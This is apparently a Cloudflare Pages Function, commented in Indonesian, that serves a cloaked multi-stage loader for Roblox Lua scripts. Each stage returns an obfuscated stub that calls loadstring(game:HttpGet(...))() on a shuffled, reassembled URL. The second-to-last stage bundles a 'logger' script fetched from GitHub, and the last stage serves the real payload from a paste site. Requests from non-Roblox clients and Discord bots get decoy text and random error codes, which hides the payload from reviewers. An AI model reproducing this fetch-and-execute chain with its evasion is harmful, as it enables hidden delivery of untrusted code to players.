// functions/api/loader/[[path]].js - Cloudflare Pages Functions
// LOADER DENGAN MULTI-LAYER PROTECTION MENGGUNAKAN KV (Binding: ndraawzontop)

import kvHelper from '../../helper/kv-helper.js';

const SETTINGS = {
    TOTAL_LAYERS: 5,
    RATE_LIMIT_MS: 10000,
    RATE_LIMIT_MAX: 3,
    SESSION_TTL: 10000,
    PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
    REAL_SCRIPT_URL: "https://pastefy.app/Uy6DD9Dy/raw",
    LOGGER_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader-api/refs/heads/main/api/logger/logscript.lua"
};

// ========== FUNGSI FETCH RAW ==========
async function fetchRaw(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) return null;
        return await response.text();
    } catch (e) {
        return null;
    }
}

// ========== FUNGSI RANDOM ERROR ==========
function getRandomError() {
    const errorCodes = [400, 401, 403, 404, 500, 502, 503];
    return errorCodes[Math.floor(Math.random() * errorCodes.length)];
}

// ========== FUNGSI LOG KE SECURITY ==========
async function sendSecurityLogToLogJs(message, ip, type) {
    const data = JSON.stringify({
        type: "security",
        securityType: type,
        message: message,
        ip: ip
    });

    try {
        await fetch('https://ndraawzhub.pages.dev/api/logger/NZ-LOGGER', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: data
        });
        return true;
    } catch (e) {
        return false;
    }
}

// ========== FUNGSI OBFUSCATE URL (SAMA PERSIS DENGAN VERSI NODE.JS) ==========
function obfuscateUrl(url) {
    // Pastikan URL hanya mengandung karakter aman
    const safeUrl = url.trim();

    // Split jadi potongan 2-4 karakter
    const parts = [];
    let i = 0;
    while (i < safeUrl.length) {
        const len = Math.floor(Math.random() * 3) + 2;
        parts.push(safeUrl.substring(i, i + len));
        i += len;
    }

    // Shuffle index
    const indices = [...Array(parts.length).keys()];
    for (let i = indices.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [indices[i], indices[j]] = [indices[j], indices[i]];
    }

    // Array isi acak berdasarkan shuffle
    const shuffledParts = indices.map(i => parts[i]);

    // Escape semua karakter berbahaya
    const arrayStr = shuffledParts.map(p => {
        const escaped = p
            .replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\0/g, '\\0');
        return `'${escaped}'`;
    }).join(',');

    // Mapping posisi asli ke posisi shuffled
    const orderMap = new Array(parts.length);
    indices.forEach((originalIdx, shuffledIdx) => {
        orderMap[originalIdx] = shuffledIdx + 1;
    });

    // Nama variabel acak 2-3 huruf hindari keyword lua
    const luaKeywords = ['do','if','in','or','and','end','for','nil','not','repeat','then','true','false','local','while','break','else','elseif','function','return','until'];
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let varName = '';
    do {
        varName = '';
        const varLen = Math.floor(Math.random() * 2) + 2;
        for (let i = 0; i < varLen; i++) {
            varName += chars[Math.floor(Math.random() * chars.length)];
        }
    } while (luaKeywords.includes(varName));

    // Concat acak - SAMA PERSIS DENGAN VERSI NODE.JS
    const concatStr = orderMap.map(i => `${varName}[${i}]`).join('..');

    // ========== KEMBALIKAN TANPA TASK.SPAWN ==========
    // Biarkan seperti aslinya: local x={...}loadstring(game:HttpGet(...))()
    return `local ${varName}={${arrayStr}}loadstring(game:HttpGet(${concatStr}))()`;
}

// ========== HANDLER CLOUDFLARE PAGES ==========
export async function onRequest(context) {
    const { request, env } = context;

    // ========== INIT KV HELPER ==========
    const kv = kvHelper(env['ndraawzontop']);
    const { 
        makeSession, 
        getSession, 
        expireSession, 
        getRateLimit, 
        saveRateLimit 
    } = kv;

    const headers = {
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
    };

    // Handle OPTIONS
    if (request.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers });
    }

    // Hanya allow GET - SAMA PERSIS DENGAN VERSI NODE.JS
    if (request.method !== 'GET') {
        return new Response('Method Not Allowed', { status: 405, headers });
    }

    const now = Date.now();
    const ip = request.headers.get('cf-connecting-ip') ||
               request.headers.get('x-forwarded-for')?.split(',')[0] ||
               request.headers.get('x-real-ip') ||
               "unknown";
    const agent = request.headers.get('user-agent') || "";
    const cleanIp = ip.replace('::ffff:', '').trim();

    // ========== CEK USER-AGENT ==========
    const isRoblox = agent.includes("Roblox") && 
                     (request.headers.get('roblox-id') || 
                      request.headers.get('x-roblox-place-id') || 
                      agent.includes("RobloxApp"));
    const isDiscord = agent.includes("Discordbot");

    // ========== BLOKIR NON-ROBLOX / DISCORD ==========
    if (!isRoblox || isDiscord) {
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
            status: getRandomError(),
            headers
        });
    }

    // ========== PARSE URL ==========
    const url = new URL(request.url);
    const queryString = url.search || "";
    const params = queryString ? queryString.replace('?', '').split('.') : [];

    const step = params[0] || '0';
    const id = params[1] || '';
    const key = params[2] || '';

    const currentStep = parseInt(step) || 0;
    const host = request.headers.get('host') || 'your-domain.pages.dev';
    const currentPath = url.pathname;

    try {
        // ========== STEP 0: RATE LIMIT + INIT SESSION ==========
        if (currentStep === 0) {
            let rateData = await getRateLimit(cleanIp);

            if (rateData) {
                const elapsed = now - rateData.firstRequestAt;
                const sisaCooldown = Math.ceil((SETTINGS.RATE_LIMIT_MS - elapsed) / 1000);

                if (elapsed < SETTINGS.RATE_LIMIT_MS) {
                    rateData.count++;
                    await saveRateLimit(cleanIp, rateData);

                    if (rateData.count > SETTINGS.RATE_LIMIT_MAX) {
                        await sendSecurityLogToLogJs(
                            `🚨 **SPAM DETECTED**\n` +
                            `📡 **IP:** \`${cleanIp}\`\n` +
                            `🔢 **Load ke:** ${rateData.count}x (maks ${SETTINGS.RATE_LIMIT_MAX}x per ${SETTINGS.RATE_LIMIT_MS / 1000} detik)\n` +
                            `⏳ **Sisa cooldown:** ${sisaCooldown} detik lagi`,
                            cleanIp,
                            "spam_detect"
                        );
                        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
                        return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
                            status: getRandomError(),
                            headers
                        });
                    }
                } else {
                    rateData = { count: 1, firstRequestAt: now };
                    await saveRateLimit(cleanIp, rateData);
                }
            } else {
                rateData = { count: 1, firstRequestAt: now };
                await saveRateLimit(cleanIp, rateData);
            }

            // Generate sequence
            let sequence = [];
            while (sequence.length < SETTINGS.TOTAL_LAYERS) {
                let r = Math.floor(Math.random() * 300) + 1;
                if (!sequence.includes(r)) sequence.push(r);
            }

            const { newSessionID, nextKey } = await makeSession(cleanIp, sequence, 0);
            const nextUrl = "https://" + host + currentPath + "?" + sequence[0] + "." + newSessionID + "." + nextKey;
            return new Response(obfuscateUrl(nextUrl), {
                status: 200,
                headers
            });
        }

        // ========== VALIDASI HANDSHAKE ==========
        const session = await getSession(id);

        if (!session || session.ownerIP !== cleanIp) {
            const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
            return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
                status: getRandomError(),
                headers
            });
        }

        // ========== CEK STEP ==========
        if (currentStep !== session.stepSequence[session.currentIndex]) {
            await expireSession(id);
            return new Response("SECURITY : BANNED ACCESS!", {
                status: getRandomError(),
                headers
            });
        }

        // ========== CEK REPLAY ATTACK ==========
        if (session.used === true) {
            await sendSecurityLogToLogJs(
                `🚫 **REPLAY ATTACK DETECTED**\n` +
                `📡 **IP:** \`${cleanIp}\`\n` +
                `🔑 **Key:** \`${key}\`\n` +
                `🆔 **Session ID:** \`${id}\`\n` +
                `⚠️ Mencoba mengakses link yang sudah mati`,
                cleanIp,
                "replay_attack"
            );
            return new Response("SECURITY : BANNED ACCESS!", {
                status: getRandomError(),
                headers
            });
        }

        // ========== CEK INVALID KEY ==========
        if (session.nextKey !== key) {
            await sendSecurityLogToLogJs(
                `🔑 **INVALID KEY DETECTED**\n` +
                `📡 **IP:** \`${cleanIp}\`\n` +
                `❌ **Key dikirim:** \`${key}\`\n` +
                `⚠️ Key tidak cocok`,
                cleanIp,
                "invalid_key"
            );
            await expireSession(id);
            return new Response("SECURITY : BANNED ACCESS!", {
                status: getRandomError(),
                headers
            });
        }

        const idx = session.currentIndex;

        // ========== LAYER TERAKHIR: MAIN SCRIPT ==========
        if (idx === SETTINGS.TOTAL_LAYERS - 1) {
            const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
            await expireSession(id);
            return new Response(mainScript || '', {
                status: 200,
                headers
            });
        }

        // ========== LAYER SEBELUM TERAKHIR: LOGGER + LOADSTRING ==========
        if (idx === SETTINGS.TOTAL_LAYERS - 2) {
            const nextIdx = SETTINGS.TOTAL_LAYERS - 1;
            const nextStepNumber = session.stepSequence[nextIdx];
            const { newSessionID, nextKey } = await makeSession(session.ownerIP, session.stepSequence, nextIdx);
            await expireSession(id);

            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;

            // ========== KEMBALIKAN SAMA PERSIS DENGAN VERSI NODE.JS ==========
            const luaScript = obfuscateUrl(nextUrl) + "\n" + (loggerScript || '');
            return new Response(luaScript, {
                status: 200,
                headers
            });
        }

        // ========== LAYER BIASA: REDIRECT ==========
        const nextIdx = idx + 1;
        const nextStepNumber = session.stepSequence[nextIdx];
        const { newSessionID, nextKey } = await makeSession(session.ownerIP, session.stepSequence, nextIdx);
        await expireSession(id);

        const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
        return new Response(obfuscateUrl(nextUrl), {
            status: 200,
            headers
        });

    } catch (err) {
        console.error(`[LOADER] Error: ${err.message}`);
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
            status: getRandomError(),
            headers
        });
    }
}
